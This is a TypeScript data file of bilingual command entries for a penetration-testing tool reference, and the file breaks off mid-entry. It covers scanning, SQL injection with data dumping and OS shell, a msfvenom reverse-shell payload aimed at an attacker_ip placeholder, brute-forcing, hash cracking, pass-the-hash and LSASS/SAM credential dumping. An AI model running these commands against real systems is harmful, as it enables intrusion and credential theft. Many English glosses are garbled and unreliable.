import type { ToolCommand } from '../types';

export const toolCommands: ToolCommand[] = [
  {
    id: 'nmap',
    name: 'Nmap',
    description: { zh: '网络扫描和安全审计工具', en: 'Network scanning and security auditing tool' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install nmap / yum install nmap / brew install nmap',
    commands: [
      {
        name: { zh: 'TCP连接扫描', en: 'TCP Connect Scan' },
        command: 'nmap -sT target_ip',
        description: { zh: '使用TCP连接方式进行端口扫描', en: 'UseTCPConnectionMethod perform Port Scanning' },
        syntaxBreakdown: [
          { part: 'nmap', explanation: { zh: 'Nmap扫描工具', en: 'Nmap scanning tool' }, type: 'command' },
          { part: '-sT', explanation: { zh: 'TCP连接扫描模式', en: 'TCP connect scan mode' }, type: 'parameter' },
          { part: 'target_ip', explanation: { zh: '目标IP地址', en: 'Target IP address' }, type: 'value' }
        ],
        platform: 'all'
      },
      {
        name: { zh: 'SYN隐蔽扫描', en: 'SYN Stealth Scan' },
        command: 'nmap -sS target_ip',
        description: { zh: '使用SYN包进行隐蔽扫描，需要root权限', en: 'UseSYNPackage perform StealthyScan, requiresrootPermission' },
        syntaxBreakdown: [
          { part: '-sS', explanation: { zh: 'SYN扫描(半开扫描)，更隐蔽', en: 'SYN scan (half-open scan), more stealthy' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: 'UDP扫描', en: 'UDP Scan' },
        command: 'nmap -sU target_ip',
        description: { zh: '扫描UDP端口', en: 'Scan UDP ports' },
        syntaxBreakdown: [
          { part: '-sU', explanation: { zh: 'UDP扫描模式', en: 'UDP scan mode' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '服务版本探测', en: 'Service Version Detection' },
        command: 'nmap -sV target_ip',
        description: { zh: '探测开放端口的服务版本信息', en: 'Detect service version info on open ports' },
        syntaxBreakdown: [
          { part: '-sV', explanation: { zh: '服务版本探测', en: 'Service Version Detection' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '操作系统探测', en: 'OS Detection' },
        command: 'nmap -O target_ip',
        description: { zh: '尝试识别目标操作系统', en: 'Attempt to identify target OS' },
        syntaxBreakdown: [
          { part: '-O', explanation: { zh: '操作系统探测', en: 'OS Detection' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '全面扫描', en: 'Comprehensive Scan' },
        command: 'nmap -A target_ip',
        description: { zh: '启用高级功能进行全面扫描', en: 'EnableAdvancedFunction perform Comprehensive Scan' },
        syntaxBreakdown: [
          { part: '-A', explanation: { zh: '启用OS检测、版本检测、脚本扫描和traceroute', en: 'EnableOSDetection, VersionDetection, Script Scan and traceroute' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '指定端口扫描', en: 'Specified Port Scan' },
        command: 'nmap -p 22,80,443 target_ip',
        description: { zh: '只扫描指定的端口', en: 'only Scanspecified Port' },
        syntaxBreakdown: [
          { part: '-p', explanation: { zh: '指定端口', en: 'specifiedPort' }, type: 'parameter' },
          { part: '22,80,443', explanation: { zh: '端口号列表', en: 'Portnumbercolumntable' }, type: 'value' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '端口范围扫描', en: 'Port Range Scan' },
        command: 'nmap -p 1-1000 target_ip',
        description: { zh: '扫描指定范围的端口', en: 'Scanspecifiedscope Port' },
        syntaxBreakdown: [
          { part: '1-1000', explanation: { zh: '端口范围', en: 'Portscope' }, type: 'value' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '脚本扫描', en: 'Script Scan' },
        command: 'nmap --script=vuln target_ip',
        description: { zh: '使用Nmap脚本引擎进行漏洞扫描', en: 'UseNmapScriptEngine perform VulnerabilityScan' },
        syntaxBreakdown: [
          { part: '--script=', explanation: { zh: '指定Nmap脚本', en: 'specifiedNmapScript' }, type: 'parameter' },
          { part: 'vuln', explanation: { zh: '漏洞检测脚本类别', en: 'Vulnerability detection script category' }, type: 'value' }
        ],
        platform: 'all'
      },
      {
        name: { zh: 'SMB扫描', en: 'SMBScan' },
        command: 'nmap --script=smb-enum-shares,smb-enum-users target_ip',
        description: { zh: '扫描SMB共享和用户信息', en: 'ScanSMBShares and User Info' },
        platform: 'all'
      },
      {
        name: { zh: 'HTTP扫描', en: 'HTTPScan' },
        command: 'nmap --script=http-enum,http-vuln* -p 80,443 target_ip',
        description: { zh: 'HTTP服务漏洞扫描', en: 'HTTPServiceVulnerabilityScan' },
        platform: 'all'
      },
      {
        name: { zh: '快速扫描', en: 'Fast Scan' },
        command: 'nmap -F target_ip',
        description: { zh: '快速扫描，只扫描常用端口', en: 'Fast Scan, only ScanCommonPort' },
        syntaxBreakdown: [
          { part: '-F', explanation: { zh: '快速模式，扫描常用100个端口', en: 'Fast Mode, ScanCommon100Port' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '扫描网段', en: 'Scan Network Segment' },
        command: 'nmap 192.168.1.0/24',
        description: { zh: '扫描整个网段', en: 'Scan the entire network segment' },
        syntaxBreakdown: [
          { part: '192.168.1.0/24', explanation: { zh: 'CIDR格式的网段', en: 'CIDRFormat network segment' }, type: 'value' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '保存结果', en: 'Save Results' },
        command: 'nmap -oN output.txt target_ip',
        description: { zh: '将扫描结果保存到文件', en: 'will ScanResultSave to File' },
        syntaxBreakdown: [
          { part: '-oN', explanation: { zh: '普通格式输出', en: 'Normal format output' }, type: 'parameter' },
          { part: '-oX', explanation: { zh: 'XML格式输出', en: 'XMLFormatOutput' }, type: 'parameter' },
          { part: '-oG', explanation: { zh: 'Grepable格式输出', en: 'GrepableFormatOutput' }, type: 'parameter' }
        ],
        platform: 'all'
      }
    ],
    references: ['https://nmap.org/docs.html']
  },
  {
    id: 'sqlmap',
    name: 'SQLMap',
    description: { zh: '自动化SQL注入工具', en: 'Automatic-izeSQLInjectionTools' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'apt install sqlmap / pip install sqlmap',
    commands: [
      {
        name: { zh: '基础测试', en: 'Basic Test' },
        command: 'sqlmap -u "http://target.com/page?id=1"',
        description: { zh: '对URL进行SQL注入测试', en: 'for URL perform SQLInjectionTest' },
        syntaxBreakdown: [
          { part: 'sqlmap', explanation: { zh: 'SQLMap工具', en: 'SQLMapTools' }, type: 'command' },
          { part: '-u', explanation: { zh: '指定目标URL', en: 'specifiedTargetURL' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '指定参数测试', en: 'Specified Parameter Test' },
        command: 'sqlmap -u "http://target.com/page?id=1&name=test" -p id',
        description: { zh: '只测试指定的参数', en: 'only Testspecified Parameter' },
        syntaxBreakdown: [
          { part: '-p', explanation: { zh: '指定要测试的参数', en: 'specifiedNeedTest Parameter' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: 'POST请求测试', en: 'POST Request Test' },
        command: 'sqlmap -u "http://target.com/login" --data="user=admin&pass=123"',
        description: { zh: '测试POST请求', en: 'TestPOSTRequest' },
        syntaxBreakdown: [
          { part: '--data=', explanation: { zh: 'POST数据', en: 'POSTData' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '使用Cookie', en: 'Using Cookie' },
        command: 'sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=xxx"',
        description: { zh: '使用Cookie进行认证', en: 'Using Cookie perform Authentication' },
        syntaxBreakdown: [
          { part: '--cookie=', explanation: { zh: '设置Cookie', en: 'Set cookie' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '指定数据库类型', en: 'Specify Database Type' },
        command: 'sqlmap -u "http://target.com/page?id=1" --dbms=mysql',
        description: { zh: '指定后端数据库类型', en: 'specifiedBackendDatabaseType' },
        syntaxBreakdown: [
          { part: '--dbms=', explanation: { zh: '数据库类型(mysql,mssql,oracle等)', en: 'DatabaseType(mysql,mssql,oracle etc.)' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '枚举数据库', en: 'Enumerate Databases' },
        command: 'sqlmap -u "http://target.com/page?id=1" --dbs',
        description: { zh: '获取所有数据库名', en: 'ObtainallDatabasename' },
        syntaxBreakdown: [
          { part: '--dbs', explanation: { zh: '枚举数据库', en: 'Enumerate Databases' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '枚举表', en: 'Enumerate Tables' },
        command: 'sqlmap -u "http://target.com/page?id=1" -D database_name --tables',
        description: { zh: '获取指定数据库的表', en: 'ObtainspecifiedDatabase table' },
        syntaxBreakdown: [
          { part: '-D', explanation: { zh: '指定数据库', en: 'specifiedDatabase' }, type: 'parameter' },
          { part: '--tables', explanation: { zh: '枚举表', en: 'Enumerate Tables' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '枚举列', en: 'Enumerate Columns' },
        command: 'sqlmap -u "http://target.com/page?id=1" -D db -T table --columns',
        description: { zh: '获取指定表的列', en: 'ObtainSpecify table column' },
        syntaxBreakdown: [
          { part: '-T', explanation: { zh: '指定表', en: 'Specify table' }, type: 'parameter' },
          { part: '--columns', explanation: { zh: '枚举列', en: 'Enumerate Columns' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '提取数据', en: 'Extract Data' },
        command: 'sqlmap -u "http://target.com/page?id=1" -D db -T table -C col1,col2 --dump',
        description: { zh: '提取指定列的数据', en: 'ExtractSpecify column Data' },
        syntaxBreakdown: [
          { part: '-C', explanation: { zh: '指定列', en: 'Specify column' }, type: 'parameter' },
          { part: '--dump', explanation: { zh: '提取数据', en: 'Extract Data' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '获取Shell', en: 'Get Shell' },
        command: 'sqlmap -u "http://target.com/page?id=1" --os-shell',
        description: { zh: '尝试获取操作系统Shell', en: 'AttemptObtainOperating SystemShell' },
        syntaxBreakdown: [
          { part: '--os-shell', explanation: { zh: '获取OS交互式Shell', en: 'Obtain an interactive OS shell' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '使用代理', en: 'Using Proxy' },
        command: 'sqlmap -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080"',
        description: { zh: '通过代理发送请求', en: 'throughProxySendRequest' },
        syntaxBreakdown: [
          { part: '--proxy=', explanation: { zh: '设置代理服务器', en: 'SetProxyServer' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '指定注入技术', en: 'Specify Injection Technique' },
        command: 'sqlmap -u "http://target.com/page?id=1" --technique=BEUST',
        description: { zh: '指定注入技术类型', en: 'Specify Injection TechniqueType' },
        syntaxBreakdown: [
          { part: '--technique=', explanation: { zh: 'B=布尔盲注,E=报错注入,U=联合查询,S=堆叠,T=时间盲注', en: 'B=Boolean Blind,E=Error-Based,U=Union Query,S=Stacked Queries,T=Time-Based Blind' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: 'Level和Risk', en: 'Level and Risk' },
        command: 'sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3',
        description: { zh: '设置扫描级别和风险等级', en: 'Set scan level and risk level' },
        syntaxBreakdown: [
          { part: '--level=', explanation: { zh: '扫描级别(1-5)，越高越全面', en: 'Scan level (1-5), higher means more thorough' }, type: 'parameter' },
          { part: '--risk=', explanation: { zh: '风险等级(1-3)，越高越危险', en: 'Risk level (1-3), higher means more dangerous' }, type: 'parameter' }
        ],
        platform: 'all'
      }
    ],
    references: ['https://github.com/sqlmapproject/sqlmap/wiki/Usage']
  },
  {
    id: 'metasploit',
    name: 'Metasploit',
    description: { zh: '渗透测试框架', en: 'Penetration testing framework' },
    category: { zh: '漏洞利用', en: 'Exploitation' },
    installation: 'apt install metasploit-framework',
    commands: [
      {
        name: { zh: '启动MSF', en: 'Launch MSF' },
        command: 'msfconsole',
        description: { zh: '启动Metasploit控制台', en: 'Start the Metasploit console' },
        platform: 'linux'
      },
      {
        name: { zh: '搜索模块', en: 'Search Modules' },
        command: 'search exploit apache',
        description: { zh: '搜索相关漏洞模块', en: 'SearchrelatedVulnerabilityModule' },
        syntaxBreakdown: [
          { part: 'search', explanation: { zh: '搜索命令', en: 'SearchCommand' }, type: 'command' },
          { part: 'exploit', explanation: { zh: '模块类型', en: 'ModuleType' }, type: 'value' },
          { part: 'apache', explanation: { zh: '搜索关键词', en: 'Search keyword' }, type: 'value' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '使用模块', en: 'Use Module' },
        command: 'use exploit/multi/handler',
        description: { zh: '选择要使用的模块', en: 'Select the module to use' },
        syntaxBreakdown: [
          { part: 'use', explanation: { zh: '使用模块命令', en: 'Use ModuleCommand' }, type: 'command' },
          { part: 'exploit/multi/handler', explanation: { zh: '模块路径', en: 'ModulePath' }, type: 'value' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '查看选项', en: 'View Options' },
        command: 'show options',
        description: { zh: '显示模块配置选项', en: 'DisplayModuleConfigurationoption' },
        syntaxBreakdown: [
          { part: 'show', explanation: { zh: '显示命令', en: 'DisplayCommand' }, type: 'command' },
          { part: 'options', explanation: { zh: '配置选项', en: 'Configurationoption' }, type: 'value' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '设置参数', en: 'Set Parameters' },
        command: 'set RHOSTS 192.168.1.100',
        description: { zh: '设置模块参数', en: 'SetModuleParameter' },
        syntaxBreakdown: [
          { part: 'set', explanation: { zh: '设置参数命令', en: 'Set ParametersCommand' }, type: 'command' },
          { part: 'RHOSTS', explanation: { zh: '目标主机参数', en: 'TargetHostParameter' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '设置Payload', en: 'Set Payload' },
        command: 'set PAYLOAD windows/meterpreter/reverse_tcp',
        description: { zh: '设置攻击载荷', en: 'SetAttackPayload' },
        syntaxBreakdown: [
          { part: 'PAYLOAD', explanation: { zh: '载荷参数', en: 'PayloadParameter' }, type: 'parameter' },
          { part: 'windows/meterpreter/reverse_tcp', explanation: { zh: '反向TCP连接的Meterpreter载荷', en: 'Reverse TCP Meterpreter payload' }, type: 'value' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '执行攻击', en: 'Execute Attack' },
        command: 'exploit',
        description: { zh: '执行攻击', en: 'Execute Attack' },
        syntaxBreakdown: [
          { part: 'exploit', explanation: { zh: '执行攻击命令', en: 'Execute AttackCommand' }, type: 'command' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '后台运行', en: 'Run in Background' },
        command: 'exploit -j',
        description: { zh: '在后台执行攻击', en: 'in Admin PanelExecute Attack' },
        syntaxBreakdown: [
          { part: '-j', explanation: { zh: '后台任务模式', en: 'Admin PaneltaskMode' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '生成Payload', en: 'Generate Payload' },
        command: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o payload.exe',
        description: { zh: '使用msfvenom生成恶意文件', en: 'UsemsfvenomGenerateMaliciousFile' },
        syntaxBreakdown: [
          { part: 'msfvenom', explanation: { zh: 'MSF载荷生成工具', en: 'MSFPayloadGenerateTools' }, type: 'command' },
          { part: '-p', explanation: { zh: '指定载荷', en: 'specifiedPayload' }, type: 'parameter' },
          { part: '-f exe', explanation: { zh: '输出格式', en: 'OutputFormat' }, type: 'parameter' },
          { part: '-o', explanation: { zh: '输出文件', en: 'OutputFile' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: 'Meterpreter命令', en: 'MeterpreterCommand' },
        command: 'sysinfo\ngetuid\nhashdump',
        description: { zh: 'Meterpreter会话中的常用命令', en: 'MeterpreterSessionMiddle CommonCommand' },
        examples: [
          { zh: 'sysinfo - 系统信息', en: 'sysinfo - System Info' },
          { zh: 'getuid - 获取当前用户', en: 'getuid - ObtaincurrentUsers' },
          { zh: 'hashdump - 导出哈希', en: 'hashdump - Exporthash' },
          { zh: 'shell - 获取系统Shell', en: 'shell - ObtainSystemShell' },
          { zh: 'ps - 列出进程', en: 'ps - ListProcess' },
          { zh: 'migrate PID - 迁移进程', en: 'migrate PID - Migrate to another process' }
        ],
        platform: 'linux'
      }
    ],
    references: ['https://www.metasploitunleashed.com/']
  },
  {
    id: 'hydra',
    name: 'Hydra',
    description: { zh: '网络登录破解工具', en: 'NetworkLoginCrackTools' },
    category: { zh: '密码攻击', en: 'Password Attacks' },
    installation: 'apt install hydra',
    commands: [
      {
        name: { zh: 'SSH爆破', en: 'SSH Brute Force' },
        command: 'hydra -l user -P wordlist.txt ssh://target_ip',
        description: { zh: '使用用户名和密码字典爆破SSH', en: 'UseUsername and PasswordDictionaryBrute forceSSH' },
        syntaxBreakdown: [
          { part: 'hydra', explanation: { zh: 'Hydra破解工具', en: 'HydraCrackTools' }, type: 'command' },
          { part: '-l', explanation: { zh: '指定用户名', en: 'specifiedUsername' }, type: 'parameter' },
          { part: '-L', explanation: { zh: '指定用户名字典文件', en: 'specifiedUsernameDictionaryFile' }, type: 'parameter' },
          { part: '-p', explanation: { zh: '指定密码', en: 'specifiedPassword' }, type: 'parameter' },
          { part: '-P', explanation: { zh: '指定密码字典文件', en: 'specifiedPasswordDictionaryFile' }, type: 'parameter' },
          { part: 'ssh://', explanation: { zh: '目标服务协议', en: 'TargetServiceProtocol' }, type: 'value' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: 'FTP爆破', en: 'FTP Brute Force' },
        command: 'hydra -L users.txt -P passwords.txt ftp://target_ip',
        description: { zh: '爆破FTP服务', en: 'Brute forceFTPService' },
        platform: 'linux'
      },
      {
        name: { zh: 'HTTP表单爆破', en: 'HTTP Form Brute Force' },
        command: 'hydra -l admin -P wordlist.txt target_ip http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"',
        description: { zh: '爆破HTTP表单登录', en: 'Brute forceHTTPtableSingleLogin' },
        syntaxBreakdown: [
          { part: 'http-post-form', explanation: { zh: 'HTTP POST表单模块', en: 'HTTP POSTtableSingleModule' }, type: 'value' },
          { part: '^USER^', explanation: { zh: '用户名占位符', en: 'Username placeholder' }, type: 'value' },
          { part: '^PASS^', explanation: { zh: '密码占位符', en: 'Password placeholder' }, type: 'value' },
          { part: 'Invalid', explanation: { zh: '失败响应标识', en: 'FailureResponseidentifier' }, type: 'value' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: 'RDP爆破', en: 'RDP Brute Force' },
        command: 'hydra -l administrator -P wordlist.txt rdp://target_ip',
        description: { zh: '爆破RDP服务', en: 'Brute forceRDPService' },
        platform: 'linux'
      },
      {
        name: { zh: 'MySQL爆破', en: 'MySQL Brute Force' },
        command: 'hydra -l root -P wordlist.txt mysql://target_ip',
        description: { zh: '爆破MySQL数据库', en: 'Brute forceMySQLDatabase' },
        platform: 'linux'
      },
      {
        name: { zh: '多线程', en: 'Multi-threaded' },
        command: 'hydra -t 4 -l user -P wordlist.txt ssh://target_ip',
        description: { zh: '指定线程数', en: 'specifiedthread count' },
        syntaxBreakdown: [
          { part: '-t', explanation: { zh: '并发线程数', en: 'concurrentthread count' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '继续中断的任务', en: 'Resume Interrupted Task' },
        command: 'hydra -R',
        description: { zh: '恢复之前中断的任务', en: 'Resume a previously interrupted task' },
        syntaxBreakdown: [
          { part: '-R', explanation: { zh: '恢复任务', en: 'Recoverytask' }, type: 'parameter' }
        ],
        platform: 'linux'
      }
    ],
    references: ['https://github.com/vanhauser-thc/thc-hydra']
  },
  {
    id: 'john',
    name: 'John the Ripper',
    description: { zh: '密码破解工具', en: 'PasswordCrackTools' },
    category: { zh: '密码攻击', en: 'Password Attacks' },
    installation: 'apt install john',
    commands: [
      {
        name: { zh: '破解哈希', en: 'Crack Hash' },
        command: 'john --wordlist=wordlist.txt hash.txt',
        description: { zh: '使用字典破解哈希', en: 'UseDictionaryCrack Hash' },
        syntaxBreakdown: [
          { part: 'john', explanation: { zh: 'John破解工具', en: 'JohnCrackTools' }, type: 'command' },
          { part: '--wordlist=', explanation: { zh: '指定字典文件', en: 'specifiedDictionaryFile' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '自动识别格式', en: 'Auto-detect Format' },
        command: 'john --wordlist=wordlist.txt --format=raw-md5 hash.txt',
        description: { zh: '指定哈希格式', en: 'specifiedhashFormat' },
        syntaxBreakdown: [
          { part: '--format=', explanation: { zh: '指定哈希格式', en: 'specifiedhashFormat' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '显示破解结果', en: 'Show Cracked Results' },
        command: 'john --show hash.txt',
        description: { zh: '显示已破解的密码', en: 'Display already Crack Password' },
        syntaxBreakdown: [
          { part: '--show', explanation: { zh: '显示结果', en: 'Show Results' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '破解Shadow文件', en: 'Crack Shadow File' },
        command: 'unshadow /etc/passwd /etc/shadow > mypasswd\njohn --wordlist=wordlist.txt mypasswd',
        description: { zh: '破解Linux密码文件', en: 'CrackLinuxPasswordFile' },
        syntaxBreakdown: [
          { part: 'unshadow', explanation: { zh: '合并passwd和shadow文件', en: 'Combine and passwd and shadowFile' }, type: 'command' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '破解ZIP密码', en: 'Crack ZIP Password' },
        command: 'zip2john protected.zip > zip.hash\njohn --wordlist=wordlist.txt zip.hash',
        description: { zh: '破解ZIP文件密码', en: 'CrackZIPFilePassword' },
        syntaxBreakdown: [
          { part: 'zip2john', explanation: { zh: '提取ZIP密码哈希', en: 'ExtractZIPPasswordhash' }, type: 'command' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '破解RAR密码', en: 'Crack RAR Password' },
        command: 'rar2john protected.rar > rar.hash\njohn --wordlist=wordlist.txt rar.hash',
        description: { zh: '破解RAR文件密码', en: 'CrackRARFilePassword' },
        platform: 'linux'
      },
      {
        name: { zh: '破解SSH密钥', en: 'Crack SSH Key' },
        command: 'ssh2john id_rsa > ssh.hash\njohn --wordlist=wordlist.txt ssh.hash',
        description: { zh: '破解SSH私钥密码', en: 'CrackSSHprivate keyPassword' },
        platform: 'linux'
      },
      {
        name: { zh: '暴力破解', en: 'Brute Force' },
        command: 'john --incremental hash.txt',
        description: { zh: '使用暴力破解模式', en: 'UseBrute ForceMode' },
        syntaxBreakdown: [
          { part: '--incremental', explanation: { zh: '暴力破解模式', en: 'Brute ForceMode' }, type: 'parameter' }
        ],
        platform: 'linux'
      }
    ],
    references: ['https://www.openwall.com/john/doc/']
  },
  {
    id: 'hashcat',
    name: 'Hashcat',
    description: { zh: 'GPU加速密码破解工具', en: 'GPU-accelerated password cracking tool' },
    category: { zh: '密码攻击', en: 'Password Attacks' },
    installation: 'apt install hashcat',
    commands: [
      {
        name: { zh: '基础破解', en: 'Basic Cracking' },
        command: 'hashcat -m 0 -a 0 hash.txt wordlist.txt',
        description: { zh: '使用字典破解MD5哈希', en: 'UseDictionaryCrackMD5hash' },
        syntaxBreakdown: [
          { part: 'hashcat', explanation: { zh: 'Hashcat破解工具', en: 'HashcatCrackTools' }, type: 'command' },
          { part: '-m 0', explanation: { zh: '哈希类型(MD5)', en: 'hashType(MD5)' }, type: 'parameter' },
          { part: '-a 0', explanation: { zh: '攻击模式(字典攻击)', en: 'Attack Mode(DictionaryAttack)' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '攻击模式', en: 'Attack Mode' },
        command: 'hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a',
        description: { zh: '暴力破解模式', en: 'Brute ForceMode' },
        syntaxBreakdown: [
          { part: '-a 3', explanation: { zh: '暴力破解模式', en: 'Brute ForceMode' }, type: 'parameter' },
          { part: '?a', explanation: { zh: '所有字符掩码', en: 'All-character mask' }, type: 'value' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '掩码字符集', en: 'Mask Character Set' },
        command: '?l = abcdefghijklmnopqrstuvwxyz\n?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ\n?d = 0123456789\n?s = 特殊字符\n?a = 所有字符\n?b = 0x00-0xff',
        description: { zh: '掩码字符集说明', en: 'Mask Character Setdescription' },
        platform: 'all'
      },
      {
        name: { zh: '规则攻击', en: 'Rule Attack' },
        command: 'hashcat -m 0 -a 0 hash.txt wordlist.txt -r rules/best64.rule',
        description: { zh: '使用规则文件进行破解', en: 'UseRuleFile perform Crack' },
        syntaxBreakdown: [
          { part: '-r', explanation: { zh: '指定规则文件', en: 'specifiedRuleFile' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '组合攻击', en: 'Combination Attack' },
        command: 'hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt',
        description: { zh: '组合两个字典', en: 'Combine two dictionaries' },
        syntaxBreakdown: [
          { part: '-a 1', explanation: { zh: '组合攻击模式', en: 'GroupsCombineAttack Mode' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '常用哈希类型', en: 'Common Hash Types' },
        command: '-m 0 = MD5\n-m 100 = SHA1\n-m 1400 = SHA256\n-m 1700 = SHA512\n-m 1000 = NTLM\n-m 1800 = SHA512crypt\n-m 3200 = bcrypt\n-m 5600 = NetNTLMv2\n-m 13100 = Kerberos TGS',
        description: { zh: '常用哈希类型编号', en: 'Common hash type codes' },
        platform: 'all'
      },
      {
        name: { zh: '显示结果', en: 'Show Results' },
        command: 'hashcat -m 0 hash.txt --show',
        description: { zh: '显示已破解的结果', en: 'Display already Crack Result' },
        platform: 'linux'
      },
      {
        name: { zh: '基准测试', en: 'Benchmark' },
        command: 'hashcat -b',
        description: { zh: '测试GPU性能', en: 'TestGPUperformance' },
        platform: 'linux'
      }
    ],
    references: ['https://hashcat.net/wiki/']
  },
  {
    id: 'crackmapexec',
    name: 'CrackMapExec',
    description: { zh: '内网渗透瑞士军刀', en: 'Swiss army knife for intranet penetration' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: 'pip install crackmapexec',
    commands: [
      {
        name: { zh: 'SMB扫描', en: 'SMBScan' },
        command: 'crackmapexec smb 192.168.1.0/24',
        description: { zh: '扫描网段内的SMB服务', en: 'Scan Network SegmentInside SMBService' },
        syntaxBreakdown: [
          { part: 'crackmapexec', explanation: { zh: 'CME工具', en: 'CMETools' }, type: 'command' },
          { part: 'smb', explanation: { zh: 'SMB协议模块', en: 'SMBProtocolModule' }, type: 'value' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '密码喷洒', en: 'Password Spraying' },
        command: 'crackmapexec smb 192.168.1.0/24 -u users.txt -p Password123',
        description: { zh: '使用单个密码测试多个用户', en: 'UsesinglePasswordTestMultipleUsers' },
        syntaxBreakdown: [
          { part: '-u', explanation: { zh: '用户名或用户文件', en: 'Username or UsersFile' }, type: 'parameter' },
          { part: '-p', explanation: { zh: '密码或密码文件', en: 'Password or PasswordFile' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '凭证测试', en: 'Credential Testing' },
        command: 'crackmapexec smb 192.168.1.0/24 -u admin -p password',
        description: { zh: '测试凭证是否有效', en: 'TestCredentials is WhetherEffective' },
        platform: 'linux'
      },
      {
        name: 'Pass-the-Hash',
        command: 'crackmapexec smb 192.168.1.0/24 -u admin -H NTHASH',
        description: { zh: '使用哈希进行认证', en: 'Using Hash perform Authentication' },
        syntaxBreakdown: [
          { part: '-H', explanation: { zh: 'NTLM哈希', en: 'NTLMhash' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '执行命令', en: 'Execute Command' },
        command: 'crackmapexec smb 192.168.1.100 -u admin -p password -x "whoami"',
        description: { zh: '在目标机器执行命令', en: 'in TargetMachineExecute Command' },
        syntaxBreakdown: [
          { part: '-x', explanation: { zh: '执行命令', en: 'Execute Command' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '执行PowerShell', en: 'Execute PowerShell' },
        command: 'crackmapexec smb 192.168.1.100 -u admin -p password -X "Get-Process"',
        description: { zh: '在目标机器执行PowerShell', en: 'in TargetMachineExecute PowerShell' },
        syntaxBreakdown: [
          { part: '-X', explanation: { zh: '执行PowerShell命令', en: 'Execute PowerShellCommand' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: 'Dump SAM',
        command: 'crackmapexec smb 192.168.1.100 -u admin -p password --sam',
        description: { zh: '导出SAM数据库', en: 'Export SAMDatabase' },
        platform: 'linux'
      },
      {
        name: 'Dump LSASS',
        command: 'crackmapexec smb 192.168.1.100 -u admin -p password --lsa',
        description: { zh: '导出LSASS凭证', en: 'Export LSASSCredentials' },
        platform: 'linux'
      },
      {
        name: 'Mimikatz',
        command: 'crackmapexec smb 192.168.1.100 -u admin -p password -M mimikatz',
        description: { zh: '执行Mimikatz模块', en: 'ExecuteMimikatzModule' },
        syntaxBreakdown: [
          { part: '-M', explanation: { zh: '指定模块', en: 'Specify Module' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: 'WinRM',
        command: 'crackmapexec winrm 192.168.1.100 -u admin -p password',
        description: { zh: '通过WinRM执行命令', en: 'throughWinRMExecute Command' },
        platform: 'linux'
      }
    ],
    references: ['https://mpgn.gitbook.io/crackmapexec/']
  },
  {
    id: 'impacket',
    name: 'Impacket',
    description: { zh: 'Python网络协议库', en: 'PythonNetworkProtocoldatabase' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: 'pip install impacket',
    commands: [
      {
        name: 'PsExec',
        command: 'psexec.py domain/user:password@target_ip',
        description: { zh: 'PsExec远程执行', en: 'PsExecRemote Execution' },
        platform: 'linux'
      },
      {
        name: 'WMIExec',
